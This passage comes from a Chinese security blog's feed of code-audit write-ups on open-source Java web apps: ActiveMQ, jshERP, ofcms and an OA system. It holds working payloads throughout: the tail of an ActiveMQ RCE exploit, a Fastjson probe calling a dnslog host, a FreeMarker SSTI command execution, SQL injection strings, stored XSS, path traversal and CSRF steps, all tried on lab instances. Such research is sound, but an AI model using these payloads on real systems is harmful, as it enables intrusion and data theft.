class="hljs-type">byte</span>)(ClassNameBytes.length)&#125;;        <span class="hljs-type">byte</span>[] NamePartbytes = byteMerger(classLength, ClassNameBytes);        <span class="hljs-type">byte</span>[] partOne = byteMerger(notnull,NamePartbytes);        <span class="hljs-type">byte</span>[] messageLength = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x00</span>,(<span class="hljs-type">byte</span>)(messageBytes.length)&#125;;        <span class="hljs-type">byte</span>[] messagePartBytes = byteMerger(messageLength, messageBytes);        <span class="hljs-type">byte</span>[] partTwo = byteMerger(notnull, messagePartBytes);        <span class="hljs-type">byte</span>[] body =byteMerger(notnull,byteMerger(partOne,partTwo));        <span class="hljs-type">byte</span>[] packagelength = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,<span class="hljs-number">0x00</span>,(<span class="hljs-type">byte</span>)((header.length + body.length) / <span class="hljs-number">2</span> )&#125;;        <span class="hljs-type">byte</span>[] payload = byteMerger(packagelength, byteMerger(header, body));        System.out.println(<span class="hljs-string">&quot;[*] send payload :&quot;</span> + bytesToHex(payload));        outputStream.write(payload);        outputStream.flush();        outputStream.close();    &#125;&#125;</code></pre></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>官网介绍：<a href="https://activemq.apache.org/openwire-version-2-specification">https://activemq.apache.org/openwire-version-2-specification</a></p><p>协议构造：<a href="https://github.com/X1r0z/ActiveMQ-RCE">https://github.com/X1r0z/ActiveMQ-RCE</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>jshERP审计</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/jshERP%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/jshERP%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="技术框架"><a href="#技术框架" class="headerlink" title="技术框架"></a>技术框架</h1><ul><li>核心框架：SpringBoot 2.0.0</li><li>持久层框架：Mybatis 1.3.2</li><li>日志管理：Log4j 2.10.0</li><li>JS框架：Jquery 1.8.0</li><li>UI框架: EasyUI 1.9.4</li><li>模板框架: AdminLTE 2.4.0</li><li>项目管理框架: Maven 3.2.3</li></ul><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="Fastjson反序列化"><a href="#Fastjson反序列化" class="headerlink" title="Fastjson反序列化"></a>Fastjson反序列化</h2><h3 id="审计思路"><a href="#审计思路" class="headerlink" title="审计思路"></a>审计思路</h3><p>系统使用maven进行依赖管理，查看pom.xml文件，发现使用了fastjson组件</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220124827519.png"></p><p>全局搜索（Ctrl + shift + F ）项目中java后缀文件中fastjson反序列化的关键字。</p><p><strong>JSON.parseObject</strong></p><p><strong>JSON.parse</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220125031767.png"></p><p><strong>查找原则是JSON.parseObject的参数为String类型且可控。</strong></p><p>此处拿MaterialCategoryController.java做示例说明</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220125505811.png"></p><p>双击进入源码文件，可发现JSON.parseObject的参数虽为字符串类型，但是其由Long数据类型转化而来，为非可控参数，不存在漏洞点。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220125729816.png"></p><p>跟着以上原则查找，最后发现MaterialController.java中可能存在漏洞点</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220125943038.png"></p><p>该文件内JSON.parseObject的search参数由前端提供，且为String数据类型</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220130208127.png"></p><p>下一步获取请求该方法的路由映射</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220130515146.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220130536060.png"></p><p>可知请求接口为&#x2F;material&#x2F;getMaterialEnableSerialNumberList</p><p>下一步可查找包含该接口的前端页面来发送数据，也可直接向该接口发送数据</p><p><strong>查找前端页面</strong></p><p>全局搜索（Ctrl + shift + F ）项目中html后缀文件的接口字符串。</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220130859003.png"></p><p>定位到前端页面为material_forselect.html，通过项目目录结构可知请求路径为&#x2F;pages&#x2F;materials&#x2F;material_forselect.html</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220131110190.png"></p><p>访问<a href="http://172.24.79.136:8080/index.html#/pages/materials/material_forselect.html%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85">http://172.24.79.136:8080/index.html#/pages/materials/material_forselect.html并进行抓包</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220131240669.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220131332004.png"></p><p>测试发现查询功能名称和型号的参数组合即为&#x2F;material&#x2F;getMaterialEnableSerialNumberList接口的search参数值</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220131457594.png"></p><p>接下来直接向&#x2F;material&#x2F;getMaterialEnableSerialNumberList接口发包</p><p>fastjson反序列化测试payload</p><div class="code-wrapper"><pre><code class="hljs perl">&#123;<span class="hljs-string">&quot;<span class="hljs-variable">@type</span>&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;404bypass.dnslog.pw&quot;</span>&#125;</code></pre></div><p>需经URL编码作为search参数值</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /material/getMaterialEnableSerialNumberList?search=%<span class="hljs-number">7</span>B%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>F%B7%E5%<span class="hljs-number">95</span>%<span class="hljs-number">86</span>%E5%<span class="hljs-number">93</span>%<span class="hljs-number">81</span>%E6%B5%<span class="hljs-number">8</span>B%E8%AF%<span class="hljs-number">95</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>model%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>xlh123%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>D&amp;currentPage=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">10</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">172.24.79.136:8080</span><span class="hljs-attribute">Accept</span>: application/json, text/javascript, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">99</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4844</span>.<span class="hljs-number">51</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<span class="hljs-attribute">Referer</span>: &lt;http://<span class="hljs-number">172.24.79.136:8080</span>/pages/materials/material_forselect.html&gt;<span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><span class="hljs-attribute">Cookie</span>: JSESSIONID=<span class="hljs-number">06089420728167</span>DF54076EA90ED7EB2C; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="hljs-number">1676858406</span>; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="hljs-number">1676869944</span><span class="hljs-attribute">Connection</span>: close</code></pre></div><p>发包测试</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220132302204.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220132230745.png"></p><p>dnslog平台成功接收到请求，整明fastjson反序列化漏洞存在</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220132333808.png"></p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="审计思路-1"><a href="#审计思路-1" class="headerlink" title="审计思路"></a>审计思路</h3><p>项目使用了Mybatis框架，主要看sql语句与变量值是否直接进行拼接。</p><p>全局搜索（Ctrl + shift + F）项目中的xml文件的<code>$&#123;</code>关键字</p><p><strong>关键点判断，like，in，order by，group by</strong></p><p>，</p><p><strong>参数类型需要为String类型</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220144639639.png"></p><p>项目中多处使用了使用了直接拼接语句</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220150321279.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220150344321.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220150455290.png"></p><p>此处拿DepotMapperEx.xml映射文件的14行name参数做示例</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220150720395.png"></p><p>该SQL语句的ID为 selectByConditionDepot</p><p>全局查找项目的java文件哪里调用了selectByConditionDepot</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220150944217.png"></p><p>发现DepotService.java的select方法调用了selectByConditionDepot方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220151116822.png"></p><p>在查找谁调用了select方法，发现com.jsh.erp.service.depot.DepotComponent#getDepotList调用了select方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220151305790.png"></p><p>在该方法中name参数是封装在map中，且目前没有对参数值进行过滤</p><p>继续查看谁调用了getDepotList方法，发现com.jsh.erp.service.depot.DepotComponent#select</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220151848845.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220151722987.png"></p><p>再查找谁调用了com.jsh.erp.service.depot.DepotComponent#select方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220151818989.png"></p><p>发现com.jsh.erp.service.CommonQueryManager#select调用了select方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220152057099.png"></p><p>再查找谁调用了com.jsh.erp.service.CommonQueryManager#select方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220152220121.png"></p><p>发现com.jsh.erp.controller.ResourceController#getList方法调用了com.jsh.erp.service.CommonQueryManager#select方法</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220152400998.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220152622099.png"></p><p>List&lt;?&gt; list &#x3D; configResourceManager.select(apiName, parameterMap);</p><p>首先需要关注apiName和parameterMap参数的来源，apiName是接口的名称，具体值由请求时赋值，parameterMap来源接收的search参数</p><p>其次关注getList方法中是否对parameterMap参数进行字符串过滤</p><p>经检查，该方法未对search参数和parameterMap参数进行字符串过滤，该接口可能存在注入点</p><p>下一步需要知道接口的名称</p><p>根据DepotMapperEx.xml文件名称可以和depot相关，结合getList方法的请求映射路径，全局搜索html文件中&#x2F;depot&#x2F;list关键字</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220153457358.png"></p><p>发现depot.html文件中存在请求url，在结合项目目录结构，可知完整的请求URL为&#x2F;pages&#x2F;manage&#x2F;depot.html</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220153634448.png"></p><p>再访问<a href="http://172.24.79.136:8080/index.html#/pages/manage/depot.html%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%8A%93%E5%8C%85">http://172.24.79.136:8080/index.html#/pages/manage/depot.html并进行抓包</a></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220153739252.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220153817301.png"></p><p>发现存在对&#x2F;depot&#x2F;list接口的请求，search参数为我们可控的参数</p><p>初始的search参数为</p><p><strong>{“name”:””,”type”:0,”remark”:””}</strong></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220153935919.png"></p><p>payload</p><div class="code-wrapper"><pre><code class="hljs scilab">&#123;<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;&#x27;</span> <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <span class="hljs-string">&#x27;1%&#x27;</span>=<span class="hljs-string">&#x27;1&quot;</span>,<span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;remark&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;</code></pre></div><p>将payload进行URL编码后作为search参数值</p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /depot/list?search=%<span class="hljs-number">7</span>B%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>%<span class="hljs-number">3</span>D1%<span class="hljs-number">20</span>and%<span class="hljs-number">20</span>%<span class="hljs-number">271</span>%<span class="hljs-number">25</span>%<span class="hljs-number">27</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">271</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>type%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A0%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>remark%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>D&amp;currentPage=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">10</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></code></pre></div><p>进行发包</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230220154249514.png"></p><p>成功显示所有仓库信息，可知该处存在布尔SQL注入漏洞</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ofcms审计</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ofcms%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ofcms%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="项目信息"><a href="#项目信息" class="headerlink" title="项目信息"></a>项目信息</h1><p>项目：ofcms-v1.1.2</p><p>项目地址：<a href="https://gitee.com/oufu/ofcms?_from=gitee_search">https://gitee.com/oufu/ofcms?_from=gitee_search</a></p><p>前台：<a href="http://localhost:8080/ofcms/index.html">http://localhost:8080/ofcms/index.html</a></p><p>后台：<a href="http://localhost:8080/ofcms/admin/login.html">http://localhost:8080/ofcms/admin/login.html</a>admin&#x2F;123456</p><h2 id="项目技术"><a href="#项目技术" class="headerlink" title="项目技术"></a>项目技术</h2><p>Record redis spring</p><p>web开发框架：JFinal</p><p>数据库：mysql</p><p>日志管理：log4j</p><p>UI框架：layui</p><p>模板框架：freemarker</p><p>项目管理框架：maven</p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>管理后台–&gt;模板设置–&gt;模板文件</p><p>payload</p><div class="code-wrapper"><pre><code class="hljs gams">&lt;#<span class="hljs-keyword">assign</span> value=<span class="hljs-string">&quot;freemarker.template.utility.Execute&quot;</span>?new()&gt;<span class="hljs-symbol">$</span>&#123;value(<span class="hljs-string">&quot;calc.exe&quot;</span>)&#125;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201145423884.png"></p><p>访问index.html模板触发payload</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201145523037.png"></p><p>调用栈</p><div class="code-wrapper"><pre><code class="hljs jsx"></code></pre></div><h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>管理后台–&gt;系统设置–&gt;代码生成–&gt;增加表</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">update</span> of_cms_ad <span class="hljs-keyword">set</span> ad_id=updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">1</span>,<span class="hljs-keyword">database</span>()),<span class="hljs-number">1</span>)</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201145705224.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201145720339.png"></p><h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><p>管理后台–&gt;栏目管理–&gt;新增用户–&gt;上传</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201150904612.png"></p><p>上传非图片文件，利用windows特性绕过上传限制</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201151146355.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201151257381.png"></p><h2 id="任意文件写入"><a href="#任意文件写入" class="headerlink" title="任意文件写入"></a>任意文件写入</h2><p>管理后台–&gt;模板设置–&gt;模板文件–&gt;保存</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201151947742.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201152053842.png"></p><p>默认的文件保存路径：D:\Program Files\JetBrains\apache-tomcat-8.5.50\webapps\ofcms\WEB-INF\page\default\index.html</p><p>修改file_name和file_content字段可达到上传任意文件至任意路径</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201152241433.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201152316149.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201152338786.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ossys审计</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ossys%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ossys%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="项目信息"><a href="#项目信息" class="headerlink" title="项目信息"></a>项目信息</h1><p>项目地址：<a href="https://gitee.com/aaluoxiang/oa_system">https://gitee.com/aaluoxiang/oa_system</a></p><p>地址：<a href="http://localhost:8088/logins">http://localhost:8088/logins</a></p><p>账号：soli 密码：123456</p><h2 id="技术类型"><a href="#技术类型" class="headerlink" title="技术类型"></a>技术类型</h2><p><strong>前端</strong></p><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>freemarker</td><td>模板引擎</td><td>springboot1.5.6.RELEASE集成版本</td><td><a href="https://freemarker.apache.org/">https://freemarker.apache.org/</a></td></tr><tr><td>Bootstrap</td><td>前端UI框架</td><td>3.3.7</td><td><a href="http://www.bootcss.com/">http://www.bootcss.com/</a></td></tr><tr><td>Jquery</td><td>快速的JavaScript框架</td><td>1.11.3</td><td><a href="https://jquery.com/">https://jquery.com/</a></td></tr><tr><td>kindeditor</td><td>HTML可视化编辑器</td><td>4.1.10</td><td><a href="http://kindeditor.net/">http://kindeditor.net/</a></td></tr><tr><td>My97 DatePicker</td><td>时间选择器</td><td>4.8 Beta4</td><td><a href="http://www.my97.net/">http://www.my97.net/</a></td></tr></tbody></table><p><strong>后端</strong></p><table><thead><tr><th>技术</th><th>名称</th><th>版本</th><th>官网</th></tr></thead><tbody><tr><td>SpringBoot</td><td>SpringBoot框架</td><td>1.5.6.RELEASE</td><td><a href="https://spring.io/projects/spring-boot">https://spring.io/projects/spring-boot</a></td></tr><tr><td>JPA</td><td>spring-data-jpa</td><td>1.5.6.RELEASE</td><td><a href="https://projects.spring.io/spring-data-jpa">https://projects.spring.io/spring-data-jpa</a></td></tr><tr><td>Mybatis</td><td>Mybatis框架</td><td>1.3.0</td><td><a href="http://www.mybatis.org/mybatis-3">http://www.mybatis.org/mybatis-3</a></td></tr><tr><td>fastjson</td><td>json解析包</td><td>1.2.36</td><td><a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></td></tr><tr><td>pagehelper</td><td>Mybatis分页插件</td><td>1.0.0</td><td><a href="https://pagehelper.github.io/">https://pagehelper.github.io/</a></td></tr></tbody></table><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="SQL注入-通知"><a href="#SQL注入-通知" class="headerlink" title="SQL注入-通知"></a>SQL注入-通知</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment">#报错注入</span>&lt;http://localhost:8088/informlistpaging?baseKey=1&gt;<span class="hljs-string">&#x27; and (select extractvalue(&quot;0x7e&quot;,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select user())))a) and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<span class="hljs-comment">#时间盲注</span>&lt;http://localhost:8088/informlistpaging?baseKey=1&gt;<span class="hljs-string">&#x27; and (select * from(select(sleep(3)))a) and &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1#</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201163514103.png"></p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>src&#x2F;main&#x2F;resources&#x2F;mappers&#x2F;notice-mapper.xml</p><h2 id="SQL注入-通讯录"><a href="#SQL注入-通讯录" class="headerlink" title="SQL注入-通讯录"></a>SQL注入-通讯录</h2><div class="code-wrapper"><pre><code class="hljs n1ql">#报错注入&lt;http://localhost:8088/outaddresspaging?outtype=1&gt;&#x27; and (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-string">&quot;0x7e&quot;</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())))a) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><span class="hljs-string"></span><span class="hljs-string">&lt;http://localhost:8088/outaddresspaging?baseKey=1&gt;&#x27;</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-string">&quot;0x7e&quot;</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())))a) <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201164436642.png"></p><h2 id="存储XSS-部门管理"><a href="#存储XSS-部门管理" class="headerlink" title="存储XSS-部门管理"></a>存储XSS-部门管理</h2><p>用户管理-部门管理-编辑部门</p><div class="code-wrapper"><pre><code class="hljs xml">x&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>![image-20230201165128711](&lt;https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201165128711.png)&gt;)</code></pre></div><h2 id="存储XSS-用户管理"><a href="#存储XSS-用户管理" class="headerlink" title="存储XSS-用户管理"></a>存储XSS-用户管理</h2><p>用户管理-用户管理-编辑用户</p><p>cn.gson.oasys.controller.user.UserController#usereditpost</p><div class="code-wrapper"><pre><code class="hljs xml">x&quot;&gt;<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201170426439.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201170300641.png"></p><h2 id="存储XSS-笔记管理"><a href="#存储XSS-笔记管理" class="headerlink" title="存储XSS-笔记管理"></a>存储XSS-笔记管理</h2><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201174103239.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201174114243.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201174210075.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201174222281.png"></p><h2 id="任意文件读取-用户头像"><a href="#任意文件读取-用户头像" class="headerlink" title="任意文件读取-用户头像"></a>任意文件读取-用户头像</h2><div class="code-wrapper"><pre><code class="hljs bash">&lt;http://localhost:8088/image//image..//image..//image..//image..//test.txt&gt;</code></pre></div><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201180923286.png"></p><h2 id="CSRF-用户面板-写标签"><a href="#CSRF-用户面板-写标签" class="headerlink" title="CSRF-用户面板-写标签"></a>CSRF-用户面板-写标签</h2><p>在用户面板中写便签</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201182940305.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201183416639.png"></p><p>使用BurpSuite将新建标签的http包生成CSRF POC</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201183259028.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201183559283.png"></p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201183623615.png"></p><p>在存在账户登陆的状态下，点击Submit request，伪造请求，成功创建新的标签</p><p><img src="https://pacemrc-blog.oss-cn-beijing.aliyuncs.com/images/image-20230201183814015.png"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://xz.aliyun.com/t/11993#toc-17">https://xz.aliyun.com/t/11993#toc-17</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>华夏ER</title>
    <link href="/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8D%8E%E5%A4%8FERP%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/"/>
    <url>/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8D%8E%E5%A4%8FERP%E5%AE%A1%E8%AE%A1%E8%AE%B0%E5%BD%95/</url>
    
